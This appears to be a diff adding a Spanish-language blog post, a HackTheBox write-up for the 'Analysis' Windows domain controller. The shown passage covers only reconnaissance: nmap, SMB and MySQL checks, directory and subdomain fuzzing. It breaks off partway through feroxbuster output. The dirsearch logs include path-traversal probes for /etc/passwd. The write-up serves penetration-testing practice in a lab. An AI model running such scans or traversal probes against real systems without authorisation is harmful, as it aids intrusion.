@@ -1,0 +1,989 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Analysis (hard) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Analysis (hard)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/hard/2024/06/07/analysis.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/hard/2024/06/07/analysis.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-06-07T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Analysis (hard)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-06-07T00:00:00-06:00","datePublished":"2024-06-07T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Analysis (hard)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/hard/2024/06/07/analysis.html"},"url":"http://localhost:4000/hackthebox/machines/hard/2024/06/07/analysis.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Analysis (hard)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-06-07T00:00:00-06:00" itemprop="datePublished">
+        Jun 7, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/c31f19a4d6a3be17987a3ef98e2446a5.png" />
+</p>
+
+<ul>
+  <li>Analysis is a hard-difficulty Windows machine, featuring various vulnerabilities, focused on web applications, Active Directory (AD) privileges and process manipulation. Initially, an LDAP Injection vulnerability provides us with credentials to authenticate on a protected web application. Through this application, access to the local system is obtained by gaining command execution through an HTA file upload. On the target system, credentials for another user are found in the web application&amp;#039;s log files. Subsequently, by implementing an API Hook on <code class="language-plaintext highlighter-rouge">BCTextEncoder</code>, an encrypted password is decrypted and used to pivot to another user. Finally, by changing the password of an account that has <code class="language-plaintext highlighter-rouge">DCSync</code> rights against the domain, administrative access to the domain controller is obtained.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong> y viendo sus tecnologías.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,3268,3269,3306,5985,9389,33060,47001,49664,49665,49666,49667,49671,49674,49675,49676,49677,49682,49739 10.10.11.250 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-06 13:27 CST
+Nmap scan report <span class="k">for </span>10.10.11.250
+Host is up <span class="o">(</span>0.087s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-06-06 19:27:54Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: analysis.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: analysis.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+3306/tcp  open  mysql         MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+33060/tcp open  mysqlx?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, X11Probe, afp:
+|     Invalid message<span class="s2">"
+|     HY000
+|   LDAPBindReq:
+|     *Parse error unserializing protobuf message"</span>
+|     HY000
+|   oracle-tns:
+|     Invalid message-frame.<span class="s2">"
+|_    HY000
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49682/tcp open  msrpc         Microsoft Windows RPC
+49739/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.94SVN%I=7%D=6/6%Time=66620DC0%P=x86_64-pc-linux-gnu%r
+SF:(GenericLines,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(GetRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\</span>
+SF:0<span class="se">\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(HTTPOptions,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")
+SF:%r(RTSPRequest,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(RPCCheck,9,"</span><span class="se">\x</span>05<span class="se">\0\0</span>
+SF:<span class="se">\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSVersionBindReqTCP,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05
+SF:<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(DNSStatusRequestTCP,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0</span>
+SF:<span class="se">\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Help,9
+SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08
+SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>
+SF:05HY000<span class="s2">")%r(TerminalServerCookie,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(Ke
+SF:rberos,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(SMBProgNeg,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b
+SF:<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(X11Probe,2B,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0\x</span>1e<span class="se">\0\0\0\</span>
+SF:x01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x0fInvalid\x20message\"\x05HY000")%r(FourOhFou
+SF:rRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9,"\x05\0\0\0\x0
+SF:b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\
+SF:0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20message<span class="se">\"\x</span>05HY000<span class="s2">")%r(LDA
+SF:PBindReq,46,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\x</span>009<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'
+SF:\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20message\"\x05HY000
+SF:")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\
+SF:0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1
+SF:a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0
+SF:\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInvalid<span class="se">\x</span>20mes
+SF:sage<span class="se">\"\x</span>05HY000<span class="s2">")%r(JavaRMI,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(WMSRequ
+SF:est,9,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span><span class="s2">")%r(oracle-tns,32,"</span><span class="se">\x</span>05<span class="se">\0\0\0\x</span>0b<span class="se">\x</span>
+SF:08<span class="se">\x</span>05<span class="se">\x</span>1a<span class="se">\0</span>%<span class="se">\0\0\0\x</span>01<span class="se">\x</span>08<span class="se">\x</span>01<span class="se">\x</span>10<span class="se">\x</span>88<span class="s1">'\x1a\x16Invalid\x20message-fram
+SF:e\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,
+SF:"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'</span><span class="se">\x</span>1a<span class="se">\x</span>0fInv
+SF:alid<span class="se">\x</span>20message<span class="se">\"\x</span>05HY000<span class="s2">");
+Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+|_clock-skew: -1s
+| smb2-time:
+|   date: 2024-06-06T19:28:53
+|_  start_date: N/A
+</span></code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Estamos ante un <code class="language-plaintext highlighter-rouge">domain controller</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.250
+SMB         10.10.11.250    445    DC-ANALYSIS      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC-ANALYSIS<span class="o">)</span> <span class="o">(</span>domain:analysis.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>No podemos enumerar por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.250 <span class="nt">-u</span> <span class="s2">"miguelito"</span> <span class="nt">-p</span> <span class="s2">""</span> <span class="nt">--shares</span>
+SMB         10.10.11.250    445    DC-ANALYSIS      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC-ANALYSIS<span class="o">)</span> <span class="o">(</span>domain:analysis.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.11.250    445    DC-ANALYSIS      <span class="o">[</span>-] analysis.htb<span class="se">\m</span>iguelito: STATUS_LOGON_FAILURE
+➜  nmap smbmap <span class="nt">-H</span> 10.10.11.250 <span class="nt">--no-banner</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+<span class="o">[!]</span> Something weird happened: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - <span class="o">{</span>Access Denied<span class="o">}</span> A process has requested access to an object but has not been granted those access rights. on line 970
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos el puerto <code class="language-plaintext highlighter-rouge">3306/tcp</code> abierto pero no podemos enumerar.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap mysql <span class="nt">-h</span> 10.10.11.250
+ERROR 1130 <span class="o">(</span>HY000<span class="o">)</span>: Host <span class="s1">'10.10.14.63'</span> is not allowed to connect to this MySQL server
+</code></pre></div></div>
+
+<ul>
+  <li>Tenemos un servicio web pero no vemos nada.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/1.png" />
+</p>
+
+<ul>
+  <li>Vamos hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> para ver si encontramos algo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap curl <span class="nt">-i</span> http://10.10.11.250
+HTTP/1.1 404 Not Found
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+Server: Microsoft-HTTPAPI/2.0
+Date: Thu, 06 Jun 2024 19:37:49 GMT
+Connection: close
+Content-Length: 315
+
+&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd"</span><span class="o">&gt;</span>
+&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;
+&lt;META HTTP-EQUIV<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">Content</span><span class="o">=</span><span class="s2">"text/html; charset=us-ascii"</span><span class="o">&gt;</span>&lt;/HEAD&gt;
+&lt;BODY&gt;&lt;h2&gt;Not Found&lt;/h2&gt;
+&lt;hr&gt;&lt;p&gt;HTTP Error 404. The requested resource is not found.&lt;/p&gt;
+&lt;/BODY&gt;&lt;/HTML&gt;
+➜  nmap dirsearch <span class="nt">-u</span> http://10.10.11.250
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/miguel/Hackthebox------------------
+
+Target: http://10.10.11.250/
+
+<span class="o">[</span>13:38:03] Starting:
+<span class="o">[</span>13:38:05] 403 -  312B  - /%2e%2e//google.com
+<span class="o">[</span>13:38:06] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+<span class="o">[</span>13:38:23] 403 -  312B  - /<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\e</span>tc<span class="se">\p</span>asswd
+<span class="o">[</span>13:38:56] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+Task Completed
+</code></pre></div></div>
+
+<ul>
+  <li>Al no haber nada vamos a <code class="language-plaintext highlighter-rouge">fuzzear</code> por subdominios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ffuf <span class="nt">-u</span> http://10.10.11.250 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.analysis.htb"</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-mc</span> all <span class="nt">-ac</span>
+
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.250
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+ :: Header           : Host: FUZZ.analysis.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+________________________________________________
+
+internal                [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 89ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+</span></code></pre></div></div>
+
+<ul>
+  <li>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.250 internal.analysis.htb analysis.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
+10.10.11.250 internal.analysis.htb analysis.htb
+</code></pre></div></div>
+
+<ul>
+  <li>Si ponemos el dominio normal vemos que nos carga lo siguiente.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/2.png" />
+</p>
+
+<ul>
+  <li>Si cargamos el otro subdominio vemos que nos da un código de estado <code class="language-plaintext highlighter-rouge">403</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/3.png" />
+</p>
+
+<ul>
+  <li>Vamos hacer <strong>Fuzzing</strong> para ver si encontramos alguna ruta interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content dirsearch <span class="nt">-u</span> http://internal.analysis.htb
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/miguel/Hackthebox/
+
+Target: http://internal.analysis.htb/
+
+<span class="o">[</span>12:23:22] Starting:
+<span class="o">[</span>12:23:23] 403 -  312B  - /%2e%2e//google.com
+<span class="o">[</span>12:23:23] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+<span class="o">[</span>12:23:43] 403 -  312B  - /<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\.</span>.<span class="se">\e</span>tc<span class="se">\p</span>asswd
+<span class="o">[</span>12:24:17] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+<span class="o">[</span>12:24:25] 301 -  174B  - /dashboard  -&gt;  http://internal.analysis.htb/dashboard/
+<span class="o">[</span>12:25:44] 301 -  170B  - /users  -&gt;  http://internal.analysis.htb/users/
+
+Task Completed
+</code></pre></div></div>
+
+<ul>
+  <li>En la ruta <code class="language-plaintext highlighter-rouge">dashboard</code> seguimos sin ver nada.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/4.png" />
+</p>
+
+<ul>
+  <li>Al igual que en la ruta <code class="language-plaintext highlighter-rouge">users</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/analysis/5.png" />
+</p>
+
+<ul>
+  <li>Podemos hacer <code class="language-plaintext highlighter-rouge">Fuzzing</code> por rutas con terminación <code class="language-plaintext highlighter-rouge">.php</code> y vemos que algunos tiene código de estado <code class="language-plaintext highlighter-rouge">200</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content feroxbuster <span class="nt">-u</span> http://internal.analysis.htb <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-x</span> php
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
+|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
+by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.10.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://internal.analysis.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ <span class="nb">true</span>
+ 💲  Extensions            │ <span class="o">[</span>php]
+ 🏁  HTTP methods          │ <span class="o">[</span>GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press <span class="o">[</span>ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET       29l       91w     1273c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with <span class="nt">--dont-filter</span>
+403      GET       29l       93w     1284c http://internal.analysis.htb/
+301      GET        2l       10w      170c http://internal.analysis.htb/users <span class="o">=&gt;</span> http://internal.analysis.htb/users/
+200      GET        1l        2w       17c http://internal.analysis.htb/users/list.php
+301      GET        2l       10w      174c http://internal.analysis.htb/dashboard <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/
+301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/img <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/img/
+200      GET        4l        4w       38c http://internal.analysis.htb/dashboard/index.php
+301      GET        2l       10w      182c http://internal.analysis.htb/dashboard/uploads <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/uploads/
+200      GET        0l        0w        0c http://internal.analysis.htb/dashboard/upload.php
+200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/details.php
+301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/css <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/css/
+200      GET        4l        4w       38c http://internal.analysis.htb/dashboard/Index.php
+301      GET        2l       10w      170c http://internal.analysis.htb/Users <span class="o">=&gt;</span> http://internal.analysis.htb/Users/
+301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/lib <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/lib/
+200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/form.php
+301      GET        2l       10w      177c http://internal.analysis.htb/dashboard/js <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/js/
+200      GET        1l        2w       17c http://internal.analysis.htb/Users/list.php
+302      GET        0l        0w        3c http://internal.analysis.htb/dashboard/logout.php <span class="o">=&gt;</span> ../employees/login.php
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/css/Sports.php
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/css/messages.php
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/HG.php
+200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/tickets.php
+200      GET        1l        2w       17c http://internal.analysis.htb/users/List.php
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/img/ITKnowledgeExchange
+301      GET        2l       10w      174c http://internal.analysis.htb/employees <span class="o">=&gt;</span> http://internal.analysis.htb/employees/
+200      GET       30l       60w     1085c http://internal.analysis.htb/employees/login.php
+200      GET        4l        4w       35c http://internal.analysis.htb/dashboard/emergency.php
+200      GET       30l       60w     1085c http://internal.analysis.htb/employees/Login.php
+301      GET        2l       10w      178c http://internal.analysis.htb/dashboard/IMG <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/IMG/
+301      GET        2l       10w      184c http://internal.analysis.htb/dashboard/lib/chart <span class="o">=&gt;</span> http://internal.analysis.htb/dashboard/lib/chart/
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/lib/752
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/uploads/712
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/js/1368.php
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/uploads/index_19.php
+200      GET        4l        4w       38c http://internal.analysis.htb/dashboard/INDEX.php
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/lib/2005_12.php
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/johnson.php
+404      GET        0l        0w     1259c http://internal.analysis.htb/jeep
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/lib/ur-guest.php
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/IMG/spotlight.php
+200      GET        1l        2w       17c http://internal.analysis.htb/Users/List.php
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/lib/agencies
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/google_logo.php
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/lib/chart/F
+404      GET        0l        0w     1259c http://internal.analysis.htb/dashboard/IMG/siteMap.php
